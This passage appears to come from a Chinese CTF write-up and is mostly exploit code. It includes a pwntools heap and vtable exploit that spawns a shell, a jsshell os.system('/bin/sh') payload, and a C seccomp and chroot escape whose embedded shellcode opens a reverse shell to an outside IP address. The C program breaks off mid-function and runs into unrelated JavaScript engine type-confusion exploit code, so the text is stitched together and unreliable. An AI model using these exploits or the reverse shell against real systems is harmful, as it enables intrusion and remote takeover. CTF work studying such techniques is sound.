        return ru('Exitn')
    def buy(index, length, name):
        menu()
        sl('1')
        ru('add:')
        sl(str(index))
        ru('name')
        sl(str(length))
        ru('name:')
        sn(name)
        return 
    def select(index):
        menu()
        sl('2')
        ru('gun')
        sl(str(index))
        return
    def list():
        menu()
        sl('3')
        return
    def rename(index, length, name):
        menu()
        sl('4')
        ru('rename')
        sl(str(index))
        ru('name')
        sl(str(length))
        ru('name:')
        sn(name)
        return
    def use(ops):
        menu()
        sl('5')
        for c in ops:
            sl(str(c))
        return
    def drop(index):
        menu()
        sl('6')
        ru('delete:')
        sl(str(index))
        return 
    def main():
        #gdb.attach(r)
        ru('Token:')
        sl(token)
        buy(1, 215-8, 'A'*(215-8))
        buy(1, 31, 'A'*31)
        buy(1, 31, 'A'*31)
        buy(1, 31, 'A'*31)
        select(2)
        drop(2)
        rename(3, 15, 'AAAAn')
        menu()
        sl('5')
        ru('Select gun ')
        pie = u32(rn(4)) - 0x1d30
        log.info('pie = ' + hex(pie))
        heap = u32(rn(4))
        log.info('heap_leak = ' + hex(heap))
        sl('4')
        buy(1, 31, 'A'*31)
        drop(2)
        fake_vtable = heap + 192
        rename(1, 63, p32(pie+0x172e).ljust(63, 'A'))
        rename(3, 15, p32(fake_vtable) + p32(pie + 0x3fd0) + 'n')
        menu()
        sl('5')
        ru('Select gun ')
        addr = u32(rn(4)) - 0x712f0
        system = addr + 0x3ada0
        binsh = addr + 0x15b82b
        info("libc = " + hex(addr))
        payload = '1 '.ljust(12)
        payload += p32(system)
        payload += p32(0xdeadbeef)
        payload += p32(binsh)
        sl(payload)
        r.interactive()
        return
    if __name__ == '__main__':
        main()
**Monkey (PWN)**
mozilla的jsshell，可以在网上找到其源码，阅读发现其中加入了全局对象os，其中有system函数。
    Payload：os.system(‘/bin/sh’);
**BOJ (PWN)**
这是个黑盒测试题，经过测试发现可以使用socket系统调用，所以可以获得程序运行结果。首先readdir列目录，看到环境内部如/proc，/sys等目录都没有挂载，猜测程序在chroot
jail中，在/root/发现了scf.so，经过分析发现该so经过LD_PRELOAD加载到当前进程，使用了seccomp阻止了关键syscall，于是用x32
ABI绕过之，通过chdir + chroot的方式绕过chroot jail。
逃出jail后在根目录发现flag但是没有权限读取，在/home目录下发现了sandbox和cr，cr是负责编译与运行程序的类似crontab的程序，在其中存在命令注入漏洞，可以得到flag。
Exploit:
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define PORT "x7ax69"
    #define IPADDR "x65xc8x8ax1f"
    unsigned char code[] = 
    "x48x31xc0x48x31xffx48x31xf6x48x31xd2x4dx31xc0x6a"
    "x02x5fx6ax01x5ex6ax06x5ax6ax29x58x0fx05x49x89xc0"
    "x48x31xf6x4dx31xd2x41x52xc6x04x24x02x66xc7x44x24"
    "x02"PORT"xc7x44x24x04"IPADDR"x48x89xe6x6ax10"
    "x5ax41x50x5fx6ax2ax58x0fx05x48x31xf6x6ax03x5ex48"
    "xffxcex6ax21x58x0fx05x75xf6x48x31xffx57x57x5ex5a"
    "x48xbfx2fx2fx62x69x6ex2fx73x68x48xc1xefx08x57x54"
    "x5fx6ax3bx58x0fx05";
    int main(int argc, char* argv[], char* envp[])
    {
    struct sockaddr_in sin;
    struct stat st;
            char buf[100];
    off_t l = 0;
    int s = socket(2,1,0);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(9999);
    sin.sin_addr.s_addr = inet_addr("101.200.138.31");
    connect(s, (struct sockaddr*)&sin, sizeof(sin));
    dup2(s, 1);
    puts("Start");
    printf("%d %dn", getuid(), getgid());
            chdir("/tmp/");
            mkdir(".345", 0777);
       if(syscall(SYS_chroot|0x40000000, ".345") = 0) return val;
    return 0x100000000 + val;
    }
    function makeqword(lo,hi) {return u32(lo)+ ((u32(hi)) * 0x100000000);}
    function makesigned(val) {return (val)|0;}
    function hiword(val) {return makesigned((val)/0x100000000);}
    function loword(val) {return makesigned((val)&0xffffffff);}
    for(var i=0;i<count;i++) {
    defrag_arr[i] = new Array(
    0x11111111,0x22222222,0x33333333,0x44444444,
    0x55555555,0x66666666,0x77777777,0x7fffffff,
    0x31337,0x31337,0x31337,0x31337, 
    0x31337,0x31337,0x31337,0x31337,
    );
    }
    var evilarr = new Array(console.log);
    evilarr.length = defrag_arr[0].length;
    evilarr.__proto__ = new Proxy({}, {getPrototypeOf:function(){return defrag_arr[count/2];}});
    evilarr.__proto__.reverse = Array.prototype.reverse;
    evilarr.reverse();
    //var seg = evilarr[0];
    var vtable = evilarr[6];
    var arrtype = evilarr[5];
    var uint32arr = new ArrayBuffer(0x10);
    //var a = evilarr[8];
    var karr = new Array(
    0x11111111,0x22222222,0x33333333,0x44444444,
    0x55555555,0x66666666,0x77777777,0x7fffffff,
    0x31337,0x31337,0x31337,0x31337, 
    0x31337,0x31337,0x31337,0x31337
    );
    var karr2 = new Array(
    0x11111111,0x22222222,0x33333333,0x44444444,
    0x55555555,0x66666666,0x77777777,0x7fffffff,
    0x31337,0x31337,0x31337,0x31337, 
    0x31337,0x31337,0x31337,0x31337
    );
    karr2["cccc"] = 0x0;